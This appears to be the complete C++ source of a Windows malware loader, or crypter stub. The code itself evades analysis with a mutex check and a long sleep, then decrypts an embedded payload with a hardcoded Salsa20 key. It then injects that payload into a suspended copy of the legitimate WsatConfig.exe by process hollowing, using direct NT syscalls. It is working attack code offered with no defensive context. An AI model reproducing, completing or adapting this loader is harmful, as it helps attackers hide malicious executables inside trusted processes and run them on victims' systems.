#define _CRT_SECURE_NO_WARNINGS
#include <windows.h>
#include <TlHelp32.h>
#include <ctime>
#include "Shlwapi.h"
#include "salsa20.h"
#include "SysCall.h"
#include "resource.h"
char* target = "C:\\Windows\\Microsoft.NET\\Framework64\\v4.0.30319\\WsatConfig.exe";

/*void gen_random(char* buf, int len) {

	static const char alphanum[] =
		"0123456789"
		"ABCDEFGHIJKLMNOPQRSTUVWXYZ"
		"abcdefghijklmnopqrstuvwxyz";

	srand((unsigned)time(NULL));

	for (int i = 0; i < len; ++i)
	{
		buf[i] = alphanum[rand() % (sizeof(alphanum) - 1)];
	}
	buf[len] = 0;
}*/
int APIENTRY WinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance, LPSTR lpszCmdParam, int nCmdShow)
//int main()
{
	HANDLE mutex = CreateMutexA(FALSE, 0, "qpcxesidkhhkqpg");
	if (GetLastError() == ERROR_ALREADY_EXISTS)
	{
		exit(0);
	}
	CloseHandle(mutex);

	Sleep(31562);
	NtWriteVirtualMemory = &NtWriteVirtualMemory10;
	NtResumeThread = &NtResumeThread10;
	NtUnmapViewOfSection = &NtUnmapViewOfSection10;

	uint8_t key[32] = { 64, 6,  52, 97, 51,  77,  45, 156, 211, 33, 62,
					 30, 113, 25,   94,  5,  74, 53, 92, 106, 74, 68,
					 110,  62,  58,  96, 215, 43, 111, 94, 110,  29 };
	Salsa20 crypter(key);
	crypter.Salsa20Do((uint8_t*)&rawData[0], sizeof(rawData), 144);
	void* Image = rawData;
	IMAGE_DOS_HEADER* DOSHeader;
	IMAGE_NT_HEADERS64* NTHeader;
	IMAGE_SECTION_HEADER* SectionHeader;
	PROCESS_INFORMATION pi;
	STARTUPINFOA si;
	CONTEXT* CTX;

	DOSHeader = PIMAGE_DOS_HEADER(Image);
	NTHeader = PIMAGE_NT_HEADERS64(DWORD64(Image) + DOSHeader->e_lfanew);

	void* pImageBase;

	ZeroMemory(&pi, sizeof(pi));
	ZeroMemory(&si, sizeof(si));
	if (NTHeader->Signature == IMAGE_NT_SIGNATURE)
	{
		if (CreateProcessA(target, NULL, NULL, NULL, FALSE, CREATE_SUSPENDED, NULL, NULL, &si, &pi))
		{
			CTX = PCONTEXT(VirtualAlloc(NULL, sizeof(CTX), MEM_COMMIT, PAGE_READWRITE));
			CTX->ContextFlags = CONTEXT_FULL;

			GetThreadContext(pi.hThread, PCONTEXT(CTX));
			NtUnmapViewOfSection(pi.hProcess, (PVOID)NTHeader->OptionalHeader.ImageBase);
			pImageBase = VirtualAllocEx(pi.hProcess, (PVOID*)(NTHeader->OptionalHeader.ImageBase), NTHeader->OptionalHeader.SizeOfImage, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
			NtWriteVirtualMemory(pi.hProcess, pImageBase, Image, NTHeader->OptionalHeader.SizeOfHeaders, NULL);
			for (int i = 0; i < NTHeader->FileHeader.NumberOfSections; i++)
			{
				SectionHeader = PIMAGE_SECTION_HEADER(DWORD64(Image) + DOSHeader->e_lfanew + 264 + (i * 40));
				NtWriteVirtualMemory(pi.hProcess, LPVOID(DWORD64(pImageBase) + SectionHeader->VirtualAddress), LPVOID(DWORD64(Image) + SectionHeader->PointerToRawData), SectionHeader->SizeOfRawData, NULL);
			}
			NtWriteVirtualMemory(pi.hProcess, LPVOID(CTX->Rdx + 0x10), LPVOID(&NTHeader->OptionalHeader.ImageBase), 8, NULL);
			CTX->Rcx = DWORD64(pImageBase) + NTHeader->OptionalHeader.AddressOfEntryPoint;
			SetThreadContext(pi.hThread, PCONTEXT(CTX));
			NtResumeThread(pi.hThread, NULL);
		}
	}	
}